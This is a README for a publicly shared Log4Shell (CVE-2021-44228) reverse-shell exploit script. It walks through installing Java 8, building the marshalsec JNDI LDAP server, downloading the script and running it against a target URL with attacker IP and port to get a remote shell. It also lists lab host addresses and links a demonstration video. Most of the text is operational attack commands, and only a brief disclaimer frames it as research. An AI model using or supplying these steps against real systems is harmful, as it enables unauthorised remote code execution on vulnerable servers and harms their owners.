# Log4j2-CVE-2021-44228-revshell

    
## Usage

    $~ python3 Log4j2-revshell.py -u http://www.victimLog4j.xyz:8080 -l [AttackerIP] -p [AttackerPort] -hp [HTTPServerPort]

        usage: Log4j2-revshell.py [-h] -u TARGET -l LHOST -p LPORT -hp HTTPSERVERPORT

        Log4j2 Reverse Shell

        optional arguments:
          -h, --help            show this help message and exit
          -u TARGET, --target TARGET
                                Target URL, http://www.victimLog4j.xyz:8080
          -l LHOST, --lhost LHOST
                                Attacker IP for receive revshell
          -p LPORT, --lport LPORT
                                Attacker port for receive revshell
          -hp HTTPSERVERPORT, --httpServerport HTTPSERVERPORT
                                HTTP server port on attacker host
## Requirement
    
    1. Marshalsec jndi.LDAPRefServer # see here, https://github.com/mbechler/marshalsec
    2. Java 8 # you can get Java 8 here https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html, 
       suggested to install jdk-8u181-linux-x64.tar.gz [Java 1.8.0_181]
    3. This script, Log4j2-revshell.py

## TLDR; Guided step
 
    $ Open browser and Download Java 8 from https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html 
      In Java SE Development Kit 8u181 section, select jdk-8u181-linux-x64.tar.gz or appropriate package based on your OS.
        
    $ sudo mkdir /usr/lib/jvm #Make this dir if you do not have yet
    $ cd /usr/lib/jvm
    $ sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz #Extract downloaded jdk-8u181-linux-x64.tar.gz into /usr/lib/jvm
    $ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
    $ sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
    $ sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

    $ sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
    $ sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
    $ sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
    $ java -version #verify if you are running Java 1.8.0_181
    
    $ git clone https://github.com/mbechler/marshalsec /tmp/Log4j2-dir; cd /tmp/Log4j2-dir #Install marshalsec jndi.LDAPRefServer
    $ sudo apt install -y maven #Build marshalsec with the Java builder maven. If you do not have maven, please install first
    $ mvn clean package -DskipTests #Build marshalsec tool with maven 
    $ cd /tmp/Log4j2-dir; wget -q https://raw.githubusercontent.com/faisalfs10x/Log4j2-CVE-2021-44228-revshell/main/Log4j2-revshell.py
    
    $ python3 Log4j2-revshell.py -u http://www.victimLog4j.xyz:8080 -l [AttackerIP] -p [AttackerPort] -hp [HTTPServerPort]
    

## PoC

    target host: http://192.168.5.122:8080
    attacker host: 192.168.5.120

https://user-images.githubusercontent.com/51811615/146068317-23af25f4-9e5b-42bb-960b-6775edd5be03.mp4


## Tested on
    
    - Ubuntu 18.04

## Disclaimer:

    The script is for security analysis and research only, hence I would not be liable if it is been used for illicit activities
